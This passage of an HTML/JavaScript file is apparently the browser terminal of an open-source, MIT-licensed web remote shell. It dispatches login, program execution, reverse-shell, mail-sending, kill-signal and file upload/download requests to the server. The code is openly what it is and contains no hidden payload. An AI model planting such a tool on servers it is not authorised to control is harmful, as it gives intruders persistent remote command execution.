        HelpMsg="<p>"+encodeHTML(HelpMsg)+encodeHTML("Project page:")+project_link+encodeHTML("\nDonation Link:")+donation_link+encodeHTML("\nBitcoin address:"+DonationAddress)+"</p>"

	clientLogTXT(HelpMsg);
}

















function ShowLicense(){//Function to print This project license on the terminal.Project is released under MIT.Free and Open-Source for ever!
	License="MIT License\n\
\n\
Copyright (c) 2018 0xCoderMan\n\
\n\
Permission is hereby granted, free of charge, to any person obtaining a copy\n\
of this software and associated documentation files (the \"Software\"), to deal\n\
in the Software without restriction, including without limitation the rights\n\
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n\
copies of the Software, and to permit persons to whom the Software is\n\
furnished to do so, subject to the following conditions:\n\
\n\
The above copyright notice and this permission notice shall be included in all\n\
copies or substantial portions of the Software.\n\
\n\
THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n\
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n\
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n\
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n\
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n\
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n\
SOFTWARE.\n\n";
	clientLogTXT(encodeHTML(License));
}






var CSRF_token='';//Store CSRF token

function HTTPCommunicate(operation,params,MessageArgs){//Function To Have HTTP communication by server
var xhr;
    if (window.XMLHttpRequest) {
         // code for IE7+, Firefox, Chrome, Opera, Safari
         xhr = new XMLHttpRequest();//Define XMLHTTPREQUEST agent
    }
    else {
         // code for IE6, IE5
         xhr = new ActiveXObject("Microsoft.XMLHTTP");
    }


    xhr.open("POST",this.location, true);// xhr.open("POST","", true); Not working on IE 11 :)
    xhr.timeout = 5000;
    xhr.ontimeout=function(){xhr.abort();};
    //for upload and pexec functions Start Progress counter...  Browser will add file the cotent-type if is neccessarry.
    if(operation=="pexec" || operation=="upload"){
        xhr.upload.onprogress = function(e) {
            if (e.lengthComputable) {
                var percentComplete = (e.loaded / e.total) * 100;
                ProgressUpload(percentComplete)
            }
        };
    }else{//Not uploading files.add this header
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
		params+="&token="+CSRF_token//Set CSRF token
		
    }
    
    xhr.onreadystatechange = function(){
        
        if(this.readyState==4){
            if(this.status!=200){
                if(operation!="rv"){
                    clientLogTXT('Error:XMLHTTPRequest error:Operation '+encodeHTML(operation)+' failed.HTTP response code:'+encodeHTML(this.status)+'<br>');
                }
                return;
                
            }//HTTP code is 200 and ok,check if error is occured:
            
            var content_type=xhr.getResponseHeader('content-type')
			var token=xhr.getResponseHeader('CSRF_TOKEN')
			if(token){
			
                CSRF_token=token			
				
			}	
            var message=xhr.responseText;
			message=encodeHTML(message);//Prevent XSS
			
            if(content_type.CrossBrowserstartsWith("text/error")){//Handle Error for every operation...
                
                if(message=="AnOtherIPLoggedIN" || message=="Login" || message=="PasswordParameterNeeded" || message=="PasswordMustNotBeEmpty" || message=="WrongPassword"){
                    
                    if(operation=="login"){//Login error,may be password is wrong.
                        clientLogTXT("Failed to Login. Error messages:"+"<br>"+message+"<br>")
                        return;
                    }
                    
                    clientLogTXT('Error:First Login <br>')
                    return;
                }else if(message=="SetPassword"){
                    clientLogTXT('Error:Your password can not be empty.Set password for your account by setpass<br>')
                    return;
                }




                //Other Errors...
                switch(operation){
                    case "rv"://Reverse shell error can be read by Updator command no need for that here
                        break;
                        
                    case "setpass":
                        clientLogTXT("Failed to Set password. Error messages:"+"<br>"+message+"<br>")
                        break;
                        
                        
                    case "logout":
                        clientLogTXT("Failed to Logout. Error messages:"+"<br>"+message+"<br>")
                        break;
                        
                        
                    case "sendmail":
                        clientLogTXT("Failed to send E-mail Error messages:<br>"+message+"<br>")
                        break;
                        
                        
                    case "sigkill":
                        clientLogTXT("Failed to send killing signal:<br>"+message+"<br>")

                        break;
                        
                        
                    case "pexec":
                        clientLogTXT("failed to execute "+encodeHTML(MessageArgs[0])+"<br>"+message+"<br>")
                        break;
                        
                    case "download":
                        clientLogTXT("Failed to download file "+encodeHTML(MessageArgs[0])+" Error messages:<br>"+message+"<br>")
                        break;
                        
                        
                    case "upload":
                        clientLogTXT("Failed to upload file "+encodeHTML(MessageArgs[1])+" to "+encodeHTML(MessageArgs[0]+MessageArgs[1])+" Error messages:"+"<br>"+message+"<br>")
                        break;
                        
                        
                        
                    default:
                        
                        break;
                        
                        return;
                }
                
            }else{//No error!Process result:...
                switch(operation){
                    case "rv"://Reverse shell result can be read by Updator command no need for that here
                        break;
                        
                    case "setpass":
                        if(message=="NewPasswordSet"){clientLogTXT("Password was set to "+MessageArgs[0]+"<br>Don't Foreget it!<br>")}
                        break;
                        
                    case "logout":
                        clientLogTXT("Logged out<br>")
                        break;
                        
                        
                    case "login":
                        clientLogTXT("Logged in<br>"+message)
                        break;
                        
                        
                    case "sendmail":
                        clientLogTXT("E-mail was successfully sent<br>")
                        break;
                        
                        
                    case "sigkill":
                        clientLogTXT("killing signal was sent<br>")
                        break;
                        
                        
                    case "pexec":
                        clientLogTXT(encodeHTML(MessageArgs[0])+" was Executed<br>result:<br>"+message+"<br>")
                        break;
                        
                        
                    case "update":
                        if(message!=""){
							
							    if(!AutoUpdate){
		                            ServerOuts+=message;
							    }else{
									clientLogTXT(ServerOuts+message);
									ServerOuts='';
								}
                            
                        }
                        break;
                        
                        
                    case "download":
                        var filename=getFileNameByContentDisposition(xhr.getResponseHeader('Content-Disposition'))
                        DownLoadTextToFile(filename,content_type,message)
                        break;
                        
                        
                    case "upload":
                        clientLogTXT("File was uploaded successfully to "+encodeHTML(MessageArgs[0]+MessageArgs[1])+"<br>");
                        break;
                        
                    default:
                        break;
                        
                        return;
                }
                
            }
            
            
        }
        
        
    }
    
    
    
    

	xhr.send(params);	
}








</script>
<body onload="main()" style="" bgcolor="#888a85" onresize=''>
<iframe id="terminal" class="terminal" frameBorder="0" onload="this.contentWindow.scrollTo(0,999999);"></iframe>




<textarea type="text" id="inptxt" autocomplete="off" class="inptxt" oninput="inptxtchange(this.value)" onkeypress="keypress(event)" spellcheck="false"></textarea>

<button id="SendBtn" class="buttons sendButton" onclick="document.getElementById('inptxt').value+='\n';inptxtchange(document.getElementById('inptxt').value);document.getElementById('inptxt').focus();">Send</button>

<button id="UpBtn" class="buttons UpBtn" onclick="UpKey()">&uarr;</button>
<button id="DownBtn" class="buttons DownBtn" onclick="DownKey()">&darr;</button>

<input type="file" id="file" class="FileInput" onchange="OnFileChoose()"/>
<label id="filenamelbl" for="file" class="BrowseLabel">Browse<br>your<br>file...</label>


